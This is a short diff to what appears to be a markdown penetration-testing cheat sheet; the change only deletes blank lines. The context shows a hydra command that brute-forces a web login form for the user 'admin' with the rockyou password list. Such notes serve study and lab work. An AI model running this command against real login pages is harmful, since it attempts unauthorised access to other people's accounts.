@@ -8,7 +8,5 @@
 - HTTP LOGIN
   - `hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"`
 
-
-
 <br>
 </details>
